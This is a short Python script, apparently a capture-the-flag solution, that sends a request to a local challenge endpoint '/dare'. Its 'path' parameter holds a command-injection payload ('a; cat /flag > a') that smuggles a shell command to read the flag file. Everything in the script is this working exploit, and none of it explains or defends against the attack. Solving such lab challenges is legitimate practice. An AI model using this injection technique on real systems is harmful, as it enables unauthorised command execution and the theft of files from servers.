import requests

payload = {
    "path" : "a; cat /flag > a "
}
r = requests.get('http://challenge.localhost:80/dare', params=payload)
print(r.text)